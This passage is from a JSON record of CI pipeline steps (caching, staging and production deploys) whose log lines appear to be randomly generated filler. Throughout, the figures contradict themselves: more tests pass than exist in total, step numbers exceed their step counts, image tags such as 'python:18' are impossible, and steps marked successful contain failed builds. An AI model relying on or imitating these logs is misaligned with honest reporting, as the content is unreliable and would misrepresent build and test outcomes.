          "Platform: darwin-arm64",
          "Snapshots: 19 passed, 19 total",
          "[12:47:21] INFO: Request completed",
          "[12:47:21] DEBUG: Memory usage: 137MB",
          "  PASS: integration/test_auth_login.spec.js",
          "Finished.",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (33MB)",
          "Completed.",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:47:21] INFO: Request completed",
          "FAILED: test_api_health",
          "Test Suites: 34 passed, 29 total",
          "Generating source maps...",
          "Using Python 3.11",
          "OK",
          "\u2717 build failed with exit code 10",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] DEBUG: Connection pool: 6 active",
          "Connection established",
          "\u2713 Task completed in 2289ms",
          "Compiling src/app.ts...",
          "Tests: 53 passed, 303 total",
          "Installing jest@2.2.6",
          "Completed.",
          "Verifying...",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact downloaded: 28MB",
          "Compiling components/app.ts...",
          "[12:47:21] INFO: Request completed",
          "Step 20/16: Installing dependencies",
          "Installing webpack@5.20.0",
          "Already up to date.",
          "POST /api - 202 (457ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Checking out master branch",
          "Step 6/16: Building",
          "Building Docker image...",
          "\u2713 Task completed in 1958ms",
          "[12:47:21] INFO: Request completed",
          "GET /health - 201 (10ms)",
          "Compiling components/index.js...",
          "pip: Downloading axios-3.2.tar.gz",
          "[12:47:21] DEBUG: Query executed in 85ms",
          "pip: Installing build dependencies...",
          "Loading...",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Transforming 827 files...",
          "Exception: RuntimeError",
          "[12:47:21] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "Processing...",
          "Cache restored successfully (341MB)",
          "pip: Collecting react",
          "Step 19/21: Building",
          "[12:47:21] DEBUG: Connection pool: 16 active",
          "Minifying vendor.js",
          "[12:47:21] DEBUG: Connection pool: 15 active",
          "Snapshots: 34 passed, 10 total",
          "\u2713 Step 'install' succeeded",
          "Generating source maps...",
          "Generating source maps...",
          "FAILED: test_api_health",
          "Ready.",
          "Step 11/19: Running migrations",
          "NODE_ENV=development",
          "npm notice: package.json updated",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-14T12:47:54.935496",
        "finished_at": "2025-12-14T12:47:59.472224",
        "log_lines": [
          "=== Step: save_cache ===",
          "Ready.",
          "[12:47:21] WARN: Deprecated API usage",
          "Done.",
          "\u2713 test completed",
          "Coverage: 81% statements, 61% branches",
          "Time: 120.835s",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-6507",
          "Minifying main.js",
          "Success!",
          "Already up to date.",
          "[12:47:21] ERROR: Connection failed",
          "Step 1/23: Linting",
          "Fetching submodules...",
          "npm install: resolved 1807 packages",
          "FAILED: test_auth_login",
          "[12:47:21] INFO: Starting build process",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Layer 9/8: COPY command",
          "Coverage: 93% statements, 84% branches",
          "Ready.",
          "[12:47:21] INFO: Cache refreshed",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling utils/service.java...",
          "pip: Collecting jest",
          "Switched to branch 'bugfix/task-352'",
          "pip: Downloading jest-1.0.tar.gz",
          "Step 15/23: Deploying",
          "Time: 59.599s",
          "Processing...",
          "yarn add: Done in 10.48s",
          "[12:47:21] WARN: Deprecated API usage",
          "Test Suites: 21 passed, 38 total",
          "Using Node.js 14.15.5",
          "Waiting...",
          "Step 16/19: Installing dependencies",
          "[12:47:21] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Transforming 971 files...",
          "Coverage: 94% statements, 89% branches",
          "Step 18/19: Installing dependencies",
          "Image pulled successfully",
          "Success!",
          "Cache restored successfully (53MB)",
          "Step 20/21: Installing dependencies",
          "Tests: 302 passed, 465 total",
          "Ran 181 tests in 23s",
          "Platform: darwin-arm64",
          "Step 10/25: Deploying",
          "Cache invalidated: dependencies",
          "Loading...",
          "Step 8/24: Linting",
          "Optimizing 76 modules...",
          "Uploading artifact 'dist' (20 files)",
          "pip: Downloading axios-5.3.tar.gz",
          "Image pulled successfully",
          "Checking out master branch",
          "Test Suites: 46 passed, 42 total",
          "Minifying main.js",
          "Platform: darwin-arm64",
          "[12:47:21] INFO: Request completed",
          "[12:47:21] INFO: Connecting to database",
          "Image pulled successfully",
          "Cache hit for key-6788",
          "Test Suites: 9 passed, 29 total",
          "[12:47:21] DEBUG: Query executed in 23ms",
          "Bundling vendor.css",
          "POST /upload - 202 (328ms)",
          "pip: Collecting express",
          "\u2713 build completed",
          "Layer 6/15: ENV command",
          "Step 18/22: Testing",
          "Transforming 339 files...",
          "Compiling utils/index.js...",
          "Finished.",
          "Environment: staging",
          "Fetching submodules...",
          "GET /api - 201 (8ms)",
          "npm notice: package.json updated",
          "\u2713 Step 'setup' succeeded",
          "Pushing to registry...",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "[12:47:21] DEBUG: Initializing service",
          "pip: Collecting react",
          "Exception: RuntimeError",
          "Step 17/25: Testing",
          "Exception: RuntimeError",
          "Processing...",
          "  PASS: test_db_connect (105ms)",
          "Image pulled successfully",
          "pip: Downloading lodash-1.10.tar.gz",
          "HEAD is now at d0a6431",
          "Step 13/19: Installing dependencies",
          "[12:47:21] DEBUG: Query executed in 31ms",
          "Time: 14.256s",
          "[12:47:21] DEBUG: Initializing service",
          "Compiling components/utils.go...",
          "Ran 63 tests in 10s",
          "WARNING: react has known vulnerabilities",
          "Compiling components/handler.rs...",
          "Step 5/22: Deploying",
          "Pushing to registry...",
          "Cache restored successfully (285MB)",
          "[12:47:21] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (10 files)",
          "Creating production build...",
          "Platform: darwin-arm64",
          "  PASS: test_cache_hit (384ms)",
          "Pushing to registry...",
          "[12:47:21] DEBUG: Query executed in 71ms",
          "NODE_ENV=production",
          "\u2713 Step 'build' succeeded",
          "Compiling lib/handler.rs...",
          "Tests: 65 passed, 428 total",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Processing request",
          "HEAD is now at bde9998",
          "Compiling utils/index.js...",
          "pip: Downloading prettier-5.4.tar.gz",
          "Checking out master branch",
          "Optimizing 11 modules...",
          "Snapshots: 41 passed, 23 total",
          "Checking out main branch",
          "Test Suites: 49 passed, 16 total",
          "Optimizing 37 modules...",
          "\u2713 Task completed in 2879ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 validate completed",
          "[12:47:21] ERROR: Connection failed",
          "Fetching submodules...",
          "HEAD is now at 39706ac",
          "npm install: added 178 packages",
          "Compiling components/handler.rs...",
          "Done.",
          "Cache invalidated: node_modules",
          "OK",
          "Ran 97 tests in 43s",
          "Switched to branch 'hotfix/task-296'",
          "\u2713 All checks passed",
          "[12:47:21] ERROR: Connection failed",
          "[12:47:21] DEBUG: Connection pool: 1 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 12/16: Deploying",
          "Layer 4/15: COPY command",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Connecting to database",
          "HEAD is now at 937f5a1",
          "npm install: resolved 787 packages",
          "[12:47:21] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Checking out develop branch",
          "Switched to branch 'feature/task-100'",
          "[12:47:21] DEBUG: Connection pool: 20 active",
          "[12:47:21] DEBUG: Connection pool: 14 active",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Processing request",
          "Processing...",
          "Done.",
          "Snapshots: 45 passed, 43 total",
          "Pushing to registry...",
          "Step 16/24: Building",
          "GET /api - 204 (56ms)",
          "Switched to branch 'bugfix/task-241'",
          "Artifact uploaded: dist.zip (80MB)",
          "\u2713 deploy completed",
          "Step 9/24: Running migrations",
          "\u2713 All checks passed",
          "Creating production build...",
          "POST /data - 200 (175ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://npmjs.org/package.json",
          "  PASS: test_db_connect (311ms)",
          "  PASS: test_auth_login (335ms)",
          "[12:47:21] DEBUG: Query executed in 1ms",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] INFO: Connecting to database",
          "Ran 191 tests in 1s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Bundling styles.js",
          "Success!",
          "Minifying vendor.js",
          "HEAD is now at 5a6a7bb",
          "Cache restored successfully (193MB)",
          "Switched to branch 'hotfix/task-476'",
          "Snapshots: 27 passed, 7 total",
          "OK",
          "[12:47:21] WARN: Deprecated API usage",
          "Connection established",
          "Done.",
          "yarn add: Done in 20.0s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:18",
          "Ran 62 tests in 51s",
          "Completed.",
          "GET /status - 200 (90ms)",
          "[12:47:21] DEBUG: Query executed in 82ms",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:21] DEBUG: Initializing service",
          "Pulling image: node:3.11",
          "NODE_ENV=test",
          "Verifying...",
          "Compiling utils/app.ts...",
          "GET /health - 204 (94ms)",
          "NODE_ENV=development",
          "Artifact uploaded: build.tar.gz (10MB)",
          "yarn add: Done in 9.74s",
          "Step 12/21: Building",
          "Cache miss for key-6624",
          "[12:47:21] INFO: Starting build process",
          "NODE_ENV=development",
          "Coverage: 74% statements, 72% branches",
          "Cache restored successfully (390MB)",
          "[12:47:21] INFO: Request completed",
          "pip: Collecting lodash",
          "Checking out master branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Step 15/23: Building",
          "Step 4/24: Testing",
          "Success!",
          "Minifying main.js",
          "GET /api - 201 (56ms)",
          "Compiling components/utils.go...",
          "Verifying...",
          "Cache miss for key-1709",
          "[12:47:21] WARN: Deprecated API usage",
          "OK",
          "Using Python 3.12",
          "Image pulled successfully",
          "GET /health - 204 (83ms)",
          "[12:47:21] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "Switched to branch 'feature/task-228'",
          "Processing...",
          "Time: 94.512s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Step 7/23: Testing",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-14T12:47:59.472224",
        "finished_at": "2025-12-14T12:48:07.033438",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "npm install: added 76 packages",
          "Cache hit for key-6650",
          "Waiting...",
          "\u2713 validate completed",
          "  PASS: test_cache_hit (62ms)",
          "Cache invalidated: dependencies",
          "Waiting...",
          "npm install: added 294 packages",
          "npm install: resolved 676 packages",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Layer 8/11: ENV command",
          "Compiling components/handler.rs...",
          "Tests: 106 passed, 273 total",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: axios has known vulnerabilities",
          "Pulling image: node:latest",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Completed.",
          "Snapshots: 16 passed, 38 total",
          "HEAD is now at 720f84a",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: integration/test_db_connect.spec.js",
          "Fetching from https://npmjs.org/package.json",
          "Checking out main branch",
          "GET /status - 201 (3ms)",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "pip install: Successfully installed jest-5.20",
          "Compiling utils/utils.go...",
          "Waiting...",
          "Finished.",
          "[12:47:21] INFO: Starting build process",
          "TLS handshake completed",
          "Cache restored successfully (164MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 7.61s",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Switched to branch 'feature/task-631'",
          "HEAD is now at 916266f",
          "Artifact uploaded: dist.zip (83MB)",
          "NODE_ENV=production",
          "NODE_ENV=production",
          "Step 5/22: Running migrations",
          "WARNING: jest has known vulnerabilities",
          "npm notice: created a lockfile",
          "pip: Downloading prettier-1.19.tar.gz",
          "Compiling components/index.js...",
          "  PASS: e2e/test_db_connect.spec.js",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'install' succeeded",
          "Minifying app.js",
          "Minifying app.js",
          "Image pulled successfully",
          "HEAD is now at cdbadb5",
          "Using Node.js 15.20.5",
          "[12:47:21] INFO: Request completed",
          "Artifact downloaded: 37MB",
          "WARNING: webpack has known vulnerabilities",
          "Optimizing 86 modules...",
          "[12:47:21] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 1940 packages",
          "Creating production build...",
          "OK",
          "\u2713 test completed",
          "[12:47:21] DEBUG: Query executed in 68ms",
          "Step 13/25: Running migrations",
          "Platform: darwin-arm64",
          "Exception: TypeError",
          "[12:47:21] INFO: Connecting to database",
          "[12:47:21] INFO: Processing request",
          "Exception: NullPointerException",
          "Fetching from https://githubusercontent.com/package.json",
          "Generating source maps...",
          "Switched to branch 'feature/task-258'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/handler.rs...",
          "Success!",
          "Environment: test",
          "OK",
          "POST /upload - 202 (345ms)",
          "Cache hit for key-2475",
          "[12:47:21] INFO: Processing request",
          "Ran 172 tests in 9s",
          "yarn add: Done in 21.54s",
          "Cache invalidated: node_modules",
          "Image pulled successfully",
          "Success!",
          "Environment: production",
          "Connection established",
          "Ran 169 tests in 55s",
          "[12:47:21] WARN: Deprecated API usage",
          "Verifying...",
          "Step 15/24: Linting",
          "Compiling utils/service.java...",
          "Time: 86.834s",
          "Pulling image: python:18",
          "Bundling main.js",
          "FAILED: test_api_health",
          "Processing...",
          "npm install: resolved 193 packages",
          "  PASS: unit/test_api_health.spec.js",
          "Coverage: 82% statements, 90% branches",
          "[12:47:21] INFO: Processing request",
          "  PASS: test_user_create (354ms)",
          "npm notice: created a lockfile",
          "NODE_ENV=production",
          "Platform: win32-x64",
          "\u2713 deploy completed",
          "[12:47:21] INFO: Processing request",
          "Ran 177 tests in 53s",
          "Ran 153 tests in 45s",
          "Step 13/17: Deploying",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_auth_login (309ms)",
          "Installing jest@1.15.5",
          "Pulling image: python:3.11",
          "Test Suites: 46 passed, 31 total",
          "Pushing to registry...",
          "Layer 7/12: COPY command",
          "pip: Installing build dependencies...",
          "Step 19/22: Installing dependencies",
          "Tests: 398 passed, 363 total",
          "Image pulled successfully",
          "Step 4/15: Building",
          "yarn add: Done in 22.12s",
          "[12:47:21] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "\u2713 Task completed in 413ms",
          "Done.",
          "Compiling src/utils.go...",
          "[12:47:21] DEBUG: Connection pool: 20 active",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "Step 17/23: Installing dependencies",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-271'",
          "Snapshots: 44 passed, 15 total",
          "FAILED: test_user_create",
          "WARNING: lodash has known vulnerabilities",
          "Compiling components/index.js...",
          "Snapshots: 2 passed, 17 total",
          "POST /upload - 201 (453ms)",
          "[12:47:21] INFO: Cache refreshed",
          "OK",
          "npm notice: created a lockfile",
          "Compiling components/handler.rs...",
          "Switched to branch 'hotfix/task-947'",
          "pip: Installing build dependencies...",
          "Test Suites: 48 passed, 35 total",
          "[12:47:21] INFO: Processing request",
          "Bundling main.js",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Building Docker image...",
          "Step 3/21: Deploying",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 78",
          "pip: Downloading express-5.16.tar.gz",
          "Step 15/20: Testing",
          "Compiling components/handler.rs...",
          "npm notice: created a lockfile",
          "Cache restored successfully (26MB)",
          "Artifact downloaded: 4MB",
          "[12:47:21] DEBUG: Connection pool: 2 active",
          "\u2713 Step 'checkout' succeeded",
          "FAILED: test_user_create",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "[12:47:21] INFO: Request completed",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/20: Installing dependencies",
          "\u2713 Step 'test' succeeded",
          "Loading...",
          "Connection established",
          "Using Node.js 19.16.0",
          "Snapshots: 35 passed, 15 total",
          "Artifact downloaded: 47MB",
          "Layer 4/11: RUN command",
          "Compiling components/app.ts...",
          "NODE_ENV=development",
          "[12:47:21] INFO: Cache refreshed",
          "Cache restored successfully (218MB)",
          "Checking out master branch",
          "pip: Downloading eslint-4.12.tar.gz",
          "Platform: darwin-arm64",
          "Using Python 3.11",
          "npm install: added 88 packages",
          "Compiling components/service.java...",
          "Already up to date.",
          "Completed.",
          "[12:47:21] DEBUG: Memory usage: 320MB",
          "Fetching from https://pypi.org/package.json",
          "[12:47:21] WARN: Deprecated API usage",
          "Loading...",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] INFO: Request completed",
          "npm install: resolved 1245 packages",
          "WARNING: lodash has known vulnerabilities",
          "Artifact downloaded: 13MB",
          "Coverage: 82% statements, 96% branches",
          "\u2713 Step 'setup' succeeded",
          "Verifying...",
          "Step 7/24: Linting",
          "Time: 51.126s",
          "pip: Collecting axios",
          "NODE_ENV=production",
          "Environment: staging",
          "WARNING: react has known vulnerabilities",
          "Compiling components/service.java...",
          "WARNING: jest has known vulnerabilities",
          "Layer 6/14: COPY command",
          "Cache saved successfully",
          "Cache restored successfully (486MB)",
          "Pushing to registry...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Tests: 354 passed, 240 total",
          "[12:47:21] DEBUG: Memory usage: 711MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 433 packages",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] INFO: Processing request",
          "Test Suites: 35 passed, 20 total",
          "Uploading artifact 'coverage' (20 files)",
          "Cache hit for key-6610",
          "Pulling image: python:18",
          "Platform: darwin-arm64",
          "Ready.",
          "Step 2/22: Linting",
          "Waiting...",
          "\u2713 Task completed in 2375ms",
          "npm install: added 451 packages",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-14T12:48:07.033438",
        "finished_at": "2025-12-14T12:48:10.057924",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache restored successfully (114MB)",
          "Tests: 347 passed, 66 total",
          "Step 11/18: Testing",
          "pip: Collecting lodash",
          "npm notice: created a lockfile",
          "Pulling image: python:3.11",
          "Cache miss for key-6252",
          "Artifact uploaded: dist.zip (20MB)",
          "Using Python 3.10",
          "Compiling components/index.js...",
          "[12:47:21] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-2610",
          "Already up to date.",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 557 packages",
          "Completed.",
          "[12:47:21] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (31MB)",
          "Ran 167 tests in 33s",
          "HEAD is now at 1ea21cc",
          "\u2713 Step 'install' succeeded",
          "Snapshots: 23 passed, 21 total",
          "\u2717 build failed with exit code 116",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 All checks passed",
          "Coverage: 81% statements, 72% branches",
          "Cache miss for key-8565",
          "Tests: 134 passed, 321 total",
          "[12:47:21] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "Layer 9/13: RUN command",
          "Compiling utils/index.js...",
          "  PASS: test_db_connect (215ms)",
          "npm install: resolved 671 packages",
          "[12:47:21] DEBUG: Query executed in 83ms",
          "Compiling components/utils.go...",
          "Time: 32.384s",
          "yarn add: Done in 13.33s",
          "[12:47:21] WARN: Deprecated API usage",
          "  PASS: test_auth_login (290ms)",
          "Waiting...",
          "POST /upload - 200 (440ms)",
          "\u2713 All checks passed",
          "[12:47:21] DEBUG: Initializing service",
          "Snapshots: 49 passed, 10 total",
          "Snapshots: 46 passed, 42 total",
          "[12:47:21] INFO: Starting build process",
          "TLS handshake completed",
          "Test Suites: 13 passed, 23 total",
          "npm notice: package.json updated",
          "Pulling image: alpine:18",
          "[12:47:21] INFO: Request completed",
          "Already up to date.",
          "Loading...",
          "Pulling image: python:3.11",
          "[12:47:21] DEBUG: Connection pool: 8 active",
          "Artifact downloaded: 33MB",
          "Cache invalidated: build",
          "Step 10/21: Linting",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: dist.zip (29MB)",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] ERROR: Connection failed",
          "OK",
          "Switched to branch 'hotfix/task-289'",
          "[12:47:21] INFO: Starting build process",
          "npm install: added 161 packages",
          "\u2713 Task completed in 4672ms",
          "[12:47:21] INFO: Request completed",
          "Layer 6/8: ENV command",
          "Loading...",
          "Cache invalidated: dependencies",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Success!",
          "Installing express@4.14.5",
          "[12:47:21] INFO: Request completed",
          "Pulling image: python:3.11",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling utils/service.java...",
          "[12:47:21] DEBUG: Loading configuration",
          "Step 1/20: Installing dependencies",
          "Bundling main.js",
          "pip: Collecting react",
          "Cache restored successfully (30MB)",
          "yarn add: Done in 23.40s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling utils/app.ts...",
          "Compiling src/service.java...",
          "Loading...",
          "Optimizing 39 modules...",
          "\u2713 build completed",
          "Fetching submodules...",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "[12:47:21] DEBUG: Query executed in 32ms",
          "Loading...",
          "Installing prettier@5.18.5",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 7/9: COPY command",
          "Creating production build...",
          "Loading...",
          "[12:47:21] DEBUG: Memory usage: 1901MB",
          "Processing...",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (77MB)",
          "Loading...",
          "Bundling vendor.css",
          "\u2713 All checks passed",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "Coverage: 72% statements, 60% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Completed.",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Already up to date.",
          "Finished.",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "pip: Collecting lodash",
          "Time: 95.421s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Step 14/15: Running migrations",
          "Verifying...",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "[12:47:21] DEBUG: Query executed in 27ms",
          "Step 16/17: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://googleapis.com/package.json",
          "Cache restored successfully (465MB)",
          "yarn add: Done in 2.70s",
          "Image pulled successfully",
          "Time: 34.231s",
          "[12:47:21] INFO: Connecting to database",
          "HEAD is now at f9e9dc5",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Cache restored successfully (271MB)",
          "Creating production build...",
          "Ran 67 tests in 26s",
          "Success!",
          "Artifact uploaded: dist.zip (96MB)",
          "Verifying...",
          "Bundling main.css",
          "Step 18/15: Linting",
          "Creating production build...",
          "Switched to branch 'hotfix/task-905'",
          "Using Node.js 17.14.3",
          "[12:47:21] INFO: Processing request",
          "Using Node.js 19.9.0",
          "[12:47:21] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "Using Python 3.9",
          "pip: Collecting eslint",
          "Layer 1/8: ENV command",
          "[12:47:21] INFO: Cache refreshed",
          "pip install: Successfully installed webpack-2.20",
          "Connection established",
          "[12:47:21] DEBUG: Initializing service",
          "Image pulled successfully",
          "NODE_ENV=development",
          "pip: Collecting react",
          "Artifact uploaded: dist.zip (55MB)",
          "Tests: 216 passed, 345 total",
          "Cache hit for key-7659",
          "Time: 22.781s",
          "pip: Installing build dependencies...",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2713 validate completed",
          "Cache hit for key-9070",
          "Finished.",
          "Environment: production",
          "Test Suites: 37 passed, 18 total",
          "Cache invalidated: dependencies",
          "[12:47:21] DEBUG: Query executed in 18ms",
          "\u2713 Step 'test' succeeded",
          "Completed.",
          "npm install: resolved 1983 packages",
          "Artifact downloaded: 23MB",
          "pip: Downloading react-1.11.tar.gz",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "Uploading artifact 'coverage' (29 files)",
          "[12:47:21] DEBUG: Loading configuration",
          "npm install: added 208 packages",
          "WARNING: lodash has known vulnerabilities",
          "Compiling lib/app.ts...",
          "WARNING: eslint has known vulnerabilities",
          "Processing...",
          "[12:47:21] INFO: Processing request",
          "pip: Downloading eslint-1.10.tar.gz",
          "\u2713 Step 'install' succeeded",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "npm install: added 140 packages",
          "[12:47:21] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 34MB",
          "Uploading artifact 'build' (1 files)",
          "npm notice: package.json updated",
          "Already up to date.",
          "Cache hit for key-4775",
          "NODE_ENV=test",
          "Fetching submodules...",
          "Loading...",
          "\u2713 test completed",
          "Generating source maps...",
          "Compiling lib/service.java...",
          "Checking out master branch",
          "Installing lodash@3.13.6",
          "\u2713 Step 'test' succeeded",
          "Optimizing 59 modules...",
          "[12:47:21] WARN: Deprecated API usage",
          "Success!",
          "[12:47:21] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (73MB)",
          "Step 7/19: Testing",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 100% statements, 78% branches",
          "Compiling src/utils.go...",
          "pip: Installing build dependencies...",
          "NODE_ENV=development",
          "Already up to date.",
          "WARNING: prettier has known vulnerabilities",
          "Cache saved successfully",
          "Waiting...",
          "Image pulled successfully",
          "Layer 8/15: ENV command",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling lib/handler.rs...",
          "[12:47:21] DEBUG: Loading configuration",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-14T12:48:10.057924",
        "finished_at": "2025-12-14T12:48:14.594652",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact downloaded: 23MB",
          "Cache hit for key-3481",
          "Building Docker image...",
          "\u2713 lint completed",
          "Artifact uploaded: dist.zip (57MB)",
          "Done.",
          "NODE_ENV=production",
          "Layer 4/11: RUN command",
          "Compiling lib/app.ts...",
          "Bundling runtime.css",
          "Step 12/18: Building",
          "Compiling components/handler.rs...",
          "Artifact downloaded: 9MB",
          "Pulling image: alpine:18",
          "Transforming 569 files...",
          "Cache invalidated: build",
          "Success!",
          "Compiling utils/handler.rs...",
          "\u2717 build failed with exit code 119",
          "Building Docker image...",
          "WARNING: axios has known vulnerabilities",
          "Using Node.js 15.10.1",
          "Image pulled successfully",
          "Pulling image: python:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Bundling styles.css",
          "Ran 36 tests in 43s",
          "Exception: RuntimeError",
          "Bundling styles.js",
          "HEAD is now at 43134c2",
          "Checking out master branch",
          "Step 8/21: Testing",
          "Fetching from https://npmjs.org/package.json",
          "NODE_ENV=development",
          "Completed.",
          "\u2713 Task completed in 707ms",
          "yarn add: Done in 1.38s",
          "npm install: resolved 143 packages",
          "Transforming 699 files...",
          "Layer 8/13: COPY command",
          "Installing react@5.3.3",
          "Compiling lib/service.java...",
          "HEAD is now at 80641a8",
          "[12:47:21] INFO: Request completed",
          "Tests: 281 passed, 400 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/25: Testing",
          "Finished.",
          "Creating production build...",
          "[12:47:21] INFO: Request completed",
          "  PASS: test_db_connect (386ms)",
          "pip: Downloading react-1.9.tar.gz",
          "HEAD is now at dbe595e",
          "WARNING: prettier has known vulnerabilities",
          "Compiling components/utils.go...",
          "[12:47:21] WARN: Deprecated API usage",
          "Checking out main branch",
          "Artifact downloaded: 21MB",
          "pip: Downloading axios-5.12.tar.gz",
          "Cache saved successfully",
          "Fetching submodules...",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:21] INFO: Connecting to database",
          "Using Python 3.12",
          "\u2713 package completed",
          "Cache restored successfully (141MB)",
          "[12:47:21] DEBUG: Initializing service",
          "Cache saved successfully",
          "Verifying...",
          "Step 7/23: Building",
          "\u2713 Step 'setup' succeeded",
          "Fetching from https://gcr.io/package.json",
          "TLS handshake completed",
          "Pushing to registry...",
          "[12:47:21] DEBUG: Connection pool: 18 active",
          "Step 16/21: Deploying",
          "Already up to date.",
          "pip: Collecting express",
          "[12:47:21] INFO: Request completed",
          "Platform: win32-x64",
          "Tests: 314 passed, 202 total",
          "Loading...",
          "[12:47:21] WARN: Deprecated API usage",
          "  PASS: unit/test_user_create.spec.js",
          "npm install: resolved 126 packages",
          "Processing...",
          "Coverage: 73% statements, 83% branches",
          "Loading...",
